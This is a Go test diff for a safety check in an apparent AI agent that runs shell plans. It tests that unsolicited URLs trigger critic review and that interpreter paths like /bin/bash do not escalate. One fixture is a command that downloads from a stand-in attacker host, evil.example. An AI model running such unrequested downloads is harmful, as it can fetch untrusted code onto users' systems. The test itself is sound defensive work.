@@ -98,3 +98,51 @@ func TestProvenanceEscalation(t *testing.T) {
 		t.Fatal("user-supplied token must not escalate")
 	}
 }
+
+// TestRequiresCriticReview locks the no-false-positive policy: local script
+// work never triggers the critic; unsolicited URLs always do.
+func TestRequiresCriticReview(t *testing.T) {
+	planLocal := &ai.Plan{Steps: []ai.PlanStep{{
+		Tool:    "shell",
+		Command: "printf '#!/bin/bash\\necho hi' > grid.sh ; chmod +x grid.sh ; ./grid.sh",
+	}}}
+	if RequiresCriticReview("create grid.sh that prints hi and run it", planLocal) {
+		t.Fatal("clean local plan must NOT require critic review")
+	}
+	planNet := &ai.Plan{Steps: []ai.PlanStep{{
+		Tool:    "shell",
+		Command: "curl -o up http://evil.example/x",
+	}}}
+	if !RequiresCriticReview("create grid.sh", planNet) {
+		t.Fatal("unsolicited external URL MUST require critic review")
+	}
+	if RequiresCriticReview("download http://evil.example/x", planNet) {
+		t.Fatal("user-requested URL must NOT require critic review")
+	}
+}
+
+// TestEscalationIgnoresInterpreterPaths prevents the /bin/bash false positive
+// that quarantined legitimate script-creation plans.
+func TestEscalationIgnoresInterpreterPaths(t *testing.T) {
+	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "#!/bin/bash\necho hi"}}}
+	retrieved := "bash lives in /bin/bash and is a GNU shell"
+	if len(escalatedCommands("print hi", retrieved, plan)) != 0 {
+		t.Fatal("shared interpreter paths must NEVER escalate")
+	}
+}
+
+// TestExtractFencedShellBlocks verifies the fallback promoter parser extracts
+// full multi-line blocks so heredocs and loops execute correctly.
+func TestExtractFencedShellBlocks(t *testing.T) {
+	text := "Here you go:\n```bash\ncat > grid.sh << 'EOF'\necho hi\nEOF\nchmod +x grid.sh\n./grid.sh\n```\nDone."
+	blocks := extractFencedShellBlocks(text)
+	if len(blocks) != 1 {
+		t.Fatalf("expected 1 fenced block, got %d: %v", len(blocks), blocks)
+	}
+	if !strings.Contains(blocks[0], "EOF") {
+		t.Fatal("expected block to contain the full heredoc")
+	}
+	if extractFencedShellBlocks("no fences here") != nil {
+		t.Fatal("expected nil for unfenced text")
+	}
+}
